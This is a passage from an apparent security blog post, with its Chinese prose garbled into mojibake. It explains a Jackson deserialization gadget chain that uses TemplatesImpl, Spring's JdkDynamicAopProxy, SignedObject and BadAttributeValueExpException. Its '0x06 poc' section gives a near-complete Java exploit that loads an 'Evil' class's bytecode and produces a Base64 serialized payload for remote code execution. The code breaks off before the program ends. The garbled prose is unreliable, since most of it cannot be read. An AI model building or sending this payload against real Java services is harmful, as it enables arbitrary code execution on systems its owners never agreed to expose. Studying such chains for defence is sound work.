<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">transient</span><span class="w"> </span><span class="n">ThreadLocal</span><span class="w"> </span><span class="n">_sdom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ThreadLocal</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œæ˜¯<code>ååºåˆ—åŒ–</code>å˜›ï¼Œé—®é¢˜å¯èƒ½å°±å‡ºåœ¨è¿™é‡Œ</p>
<p>å¯ä»¥çœ‹åˆ°<code>TemplatesImpl</code>è¿™é‡Œæ˜¯ä¸ä¼šåºåˆ—åŒ–<code>_sdom</code>è¿™ä¸ªå€¼çš„ï¼ŒåŒæ—¶ååºåˆ—åŒ–çš„åœ°æ–¹ä¹Ÿä¸ä¼šèµ‹å€¼è¿™ä¸ªfiledï¼Œæ‰€ä»¥ä»–æ˜¯<code>null</code></p>
<p><img loading="lazy" src="../images/image-20241126104503286.png" alt="image-20241126104503286"  />
</p>
<h3 id="è§£å†³">è§£å†³<a hidden class="anchor" aria-hidden="true" href="#è§£å†³">#</a></h3>
<p>ä½†æ˜¯æˆ‘ä»¬ä¸éš¾æƒ³åˆ°<code>getOutputProperties</code>æ˜¯ç»§æ‰¿çš„<code>Templates</code>æ¥å£ï¼Œä»–åªæœ‰è¿™ä¸€ä¸ª<code>getter</code>å‘€ï¼Œèƒ½ä¸èƒ½æ¢æˆä»–å‘¢ï¼ˆè¿™é‡Œè¯•è¿‡ç±»å‹è½¬æ¢ï¼Œæ²¡ç”¨ï¼‰</p>
<blockquote>
<p><strong>è§£å†³åŠæ³•æ˜¯ç”¨åˆ°<code>åŠ¨æ€ä»£ç†</code></strong>ï¼Œç„¶åä»£ç†<code>Templates</code>æ¥å£ï¼Œä½¿å¾—<code>props</code>åªæœ‰<code>getOutputProperties</code>è¿™ä¸ªæ–¹æ³•ï¼Œ<code>Proxy</code>è°ƒç”¨<code>getOutputProperties()</code>,è§¦å‘ä»£ç†è°ƒç”¨invokeæ–¹æ³•ï¼Œå¦‚æœè¿™ä¸ªä»£ç†ç±»invokeæ–¹æ³•å¯ä»¥è®¾ç½®æˆ‘ä»¬çš„<code>TemplatesImpl</code>å¯¹è±¡æ¥è°ƒç”¨<code>getOutputProperties()</code>é—®é¢˜å°±è§£å†³äº†</p>
</blockquote>
<p>è¿™é‡Œéœ€è¦è¡¥å……ç‚¹ä¸œè¥¿ï¼Œæˆ‘ä»¬çŸ¥é“åºåˆ—åŒ–ä¼šè°ƒç”¨getterï¼Œä¹‹å‰åˆ†ææµç¨‹å¯èƒ½ä¸å¤Ÿç»†</p>
<p>jacksonçš„åˆå§‹åŒ–ï¼Œæœ€åˆä¼šåœ¨<code>AnnotatedMethodCollector.java#_addMemberMethods</code>ï¼Œæ‰¾åˆ°ç±»æ‰€æœ‰æ–¹æ³•å¹¶put</p>
<p><img loading="lazy" src="../images/image-20241126172654114.png" alt="image-20241126172654114"  />
</p>
<blockquote>
<p>è¿™é‡Œæ˜¯è·å–ä»£ç†çš„æ–¹æ³•ï¼Œæœ€ç»ˆå…¶å®æ˜¯é€šè¿‡åå°„<code>getDeclaredMethods()</code>è·å–çš„ï¼Œä½†æ˜¯å…¶è·å–æ–¹æ³•å¾—åˆ°çš„<code>é¡ºåº</code>æ¯æ¬¡å¯èƒ½å­˜åœ¨ä¸€äº›<code>åå·®</code>ï¼Œ<code>è¿™ä¹Ÿæ˜¯jacksoné“¾å­ä¸ç¨³å®šçš„åŸå› </code></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Method</span><span class="o">[]</span><span class="w"> </span><span class="nf">getClassMethods</span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cls</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">cls</span><span class="p">.</span><span class="na">getDeclaredMethods</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241126173030787.png" alt="image-20241126173030787"  />
</p>
<p>ä¸€å…±æ˜¯5ä¸ªæ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯<code>hashcode</code>,<code>equals</code>,<code>toString</code>,<code>getOutputProperties</code>,<code>newTransformer</code></p>
<blockquote>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨javaçš„åå°„ <strong><code>getDeclaredMethods</code> æ–¹æ³•å»è·å–<code>ä»£ç†ç±»æ‰€æœ‰æ–¹æ³•æ—¶</code>ä¹Ÿæ˜¯æ ¹æ®æˆ‘ä»¬æä¾›çš„<code>æ¥å£</code>ï¼ˆè¿™é‡Œæ˜¯<code>Templates.class</code>ï¼‰å»è·å–çš„æ–¹æ³•</strong>ã€‚ï¼Œæ‰€ä»¥åªæœ‰ä¸Šé¢5ä¸ªæ–¹æ³•ï¼Œå…¶ä»–3ä¸ªæ–¹æ³•è‡ªå¸¦çš„éƒ½ä¼šæœ‰ï¼Œç„¶ågetterå°±åªæœ‰<code>getOutputProperties</code></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Object</span><span class="w"> </span><span class="n">proxyObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åå°†è·å–çš„æ–¹æ³•è¿”å›ï¼Œè¿™é‡Œä¼šå°è¯•æ·»åŠ åˆ°propsé‡Œï¼Œåªæœ‰<code>getOutputProperties</code>æ·»åŠ äº†</p>
<p><img loading="lazy" src="../images/image-20241126175407133.png" alt="image-20241126175407133"  />
</p>
<p><img loading="lazy" src="../images/image-20241126175703650.png" alt="image-20241126175703650"  />
</p>
<p>ç„¶ååé¢å…¶ä»–çš„èµ‹å€¼å°±åªæœ‰<code>getOutputProperties</code>è¿™ä¸€ä¸ªgetteræ–¹æ³•äº†</p>
<h1 id="0x05-jdkdynamicaopproxy">0x05 JdkDynamicAopProxy<a hidden class="anchor" aria-hidden="true" href="#0x05-jdkdynamicaopproxy">#</a></h1>
<p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code>éœ€è¦aopä¾èµ–</p>
<p>è¿™ä¸ªç±»æœ‰å•¥ç”¨å‘¢ï¼Œé€šè¿‡å‰é¢çš„å¤„ç†å¯ä»¥åªè°ƒç”¨<code>getOutputProperties()</code>ï¼Œè°ƒç”¨åè§¦å‘ä»£ç†ç±»<code>invoke()</code>æ–¹æ³•ï¼Œå…¶ä¸­åœ¨<code>invokeJoinpointUsingReflection()</code>å¤„ä¼šåå°„è°ƒç”¨å¯¹åº”çš„æ–¹æ³•ï¼ˆgetOutputPropertiesï¼‰</p>
<p><img loading="lazy" src="../images/image-20241126185216356.png" alt="image-20241126185216356"  />
</p>
<p><img loading="lazy" src="../images/image-20241126185301193.png" alt="image-20241126185301193"  />
</p>
<p>æˆ‘è¿™é‡Œç¼©å‡ä¸‹ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶è¿™é‡Œ<code>target</code>ï¼Œ<code>target</code>æ¥è‡ª<code>targetSource</code>ï¼Œ<code>targetSource</code>æœ‰æ¥åˆå§‹åŒ–è®¾ç½®çš„<code>this.advised</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TargetSource</span><span class="w"> </span><span class="n">targetSource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">advised</span><span class="p">.</span><span class="na">targetSource</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">targetSource</span><span class="p">.</span><span class="na">getTarget</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241126185534951.png" alt="image-20241126185534951"  />
</p>
<p>è¿™é‡Œæˆ‘ä»¬å°†<code>TemplatesImpl</code>è¿›è¡Œ<code>AdvisedSupport</code>å°è£…æ”¾å…¥å¯¹åº”çš„å€¼ï¼Œåå°„æ—¶å°±èƒ½è°ƒç”¨åˆ°æˆ‘ä»¬æ”¾å…¥çš„<code>TemplatesImpl</code>å¯¹è±¡</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cons</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">AdvisedSupport</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cons</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">cons</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">advisedSupport</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">proxyObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">jsonNodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">proxyObj</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><h1 id="0x06-poc">0x06 poc<a hidden class="anchor" aria-hidden="true" href="#0x06-poc">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">jackson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.tomcat.util.codec.binary.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.AdvisedSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.TransformerConfigurationException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.security.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Properties</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jackson</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazzs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazzs</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//System.out.println(Base64.getEncoder().encodeToString(code));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cons</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">AdvisedSupport</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cons</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">cons</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">advisedSupport</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">proxyObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">jsonNodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">proxyObj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">badAttributeValueExpException</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="n">111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">jsonNodes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ç”Ÿæˆç§é’¥å’Œå…¬é’¥</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">KeyPairGenerator</span><span class="w"> </span><span class="n">keyPairGen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeyPairGenerator</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;RSA&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">keyPairGen</span><span class="p">.</span><span class="na">initialize</span><span class="p">(</span><span class="n">2048</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">KeyPair</span><span class="w"> </span><span class="n">keyPair</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyPairGen</span><span class="p">.</span><span class="na">generateKeyPair</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PrivateKey</span><span class="w"> </span><span class="n">privateKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyPair</span><span class="p">.</span><span class="na">getPrivate</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// åˆ›å»ºç­¾åå¼•æ“</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Signature</span><span class="w"> </span><span class="n">signingEngine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Signature</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;SHA256withRSA&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">signingEngine</span><span class="p">.</span><span class="na">initSign</span><span class="p">(</span><span class="n">privateKey</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SignedObject</span><span class="w"> </span><span class="n">signedObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SignedObject</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="n">privateKey</span><span class="p">,</span><span class="n">signingEngine</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">signedObject</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">bad</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="n">111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">bad</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">node</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">bos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">bos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">bad</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serializedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">base64EncodedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">encodeBase64</span><span class="p">(</span><span class="n">serializedBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">base64EncodedBytes</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">base64EncodedData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decodedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decodeBase64</span><span class="p">(</span><span class="n">base64EncodedData</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ååºåˆ—åŒ–</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayInputStream</span><span class="w"> </span><span class="n">bis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">serializedBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">bis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
